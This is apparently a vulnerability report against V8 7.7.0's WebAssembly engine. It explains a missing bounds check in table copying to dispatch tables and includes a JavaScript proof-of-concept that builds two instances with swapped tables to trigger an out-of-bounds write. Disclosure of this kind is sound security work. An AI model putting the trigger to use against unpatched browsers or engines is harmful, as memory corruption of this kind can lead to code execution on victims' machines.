<b>VULNERABILITY DETAILS</b>
```
bool WasmInstanceObject::CopyTableEntries(Isolate* isolate,
                                          Handle<WasmInstanceObject> instance,
                                          uint32_t table_src_index,
                                          uint32_t table_dst_index,
                                          uint32_t dst, uint32_t src,
                                          uint32_t count) {
..........
  Handle<FixedArray> dispatch_tables(table->dispatch_tables(), isolate);
  for (int i = 0; i < dispatch_tables->length();
       i += kDispatchTableNumElements) {
    Handle<WasmInstanceObject> target_instance(
        WasmInstanceObject::cast(
            dispatch_tables->get(i + kDispatchTableInstanceOffset)),
        isolate);
    CopyTableEntriesImpl(target_instance, dst, src, count, copy_backward);
  }
```
v8 engine use table 0 to be dispatch table. So dispatch table is fixed to table 0 size
When copy to dispatch table, it must check whether or not its index is zero. if not, can be overflow
<b>VERSION</b>
V8 version 7.7.0

<b>REPRODUCTION CASE</b>
load('test/mjsunit/wasm/wasm-module-builder.js');
let instance;
let instance2;
let table1 = new WebAssembly.Table({initial:0x1, maximum:0x1, element: "anyfunc"});
let table2 = new WebAssembly.Table({initial:0x100, maximum:0x100, element: "anyfunc"});

{
  let builder = new WasmModuleBuilder();

  const void_sig = builder.addType(kSig_i_i);

  const func_index = builder.addImport("q","func",void_sig);
  let sig_v_iii = builder.addType(kSig_v_iii);

  builder.addExport("hack", func_index);

  const table_index1 = builder.addImportedTable("q", "table1", 0x1, 0x1);
  const table_index2 = builder.addImportedTable("q", "table2", 0x100, 0x100);
  builder.addFunction("copy", sig_v_iii)
  .addBody([
    kExprGetLocal, 0,
    kExprGetLocal, 1,
    kExprGetLocal, 2,
    kNumericPrefix, kExprTableCopy, table_index1, table_index1])
  .exportAs("copy");

  let wasm_m = builder.toModule();

  let func = (v)=>{
    return 1;
  }
  instance = new WebAssembly.Instance(wasm_m, {q:{table1:table1, table2:table2, func:func}});
}
{
  let builder = new WasmModuleBuilder();

  const void_sig = builder.addType(kSig_i_i);

  const func_index = builder.addImport("q","func",void_sig);
  let sig_v_iii = builder.addType(kSig_v_iii);

  builder.addExport("hack", func_index);

  const table_index1 = builder.addImportedTable("q", "table1", 0x100, 0x100);
  const table_index2 = builder.addImportedTable("q", "table2", 0x1, 0x1);
  builder.addFunction("copy", sig_v_iii)
  .addBody([
    kExprGetLocal, 0,
    kExprGetLocal, 1,
    kExprGetLocal, 2,
    kNumericPrefix, kExprTableCopy, table_index1, table_index1])
  .exportAs("copy");

  let wasm_m = builder.toModule();
  let func = (v)=>{
    return 1;
  }
  instance2 = new WebAssembly.Instance(wasm_m, {q:{table1:table2, table2:table1, func:func}});
}
instance2.exports.copy(0, 20, 40);



<b>CREDIT INFORMATION</b>
Reporter credit: Woojin Oh (@pwn_expoit)

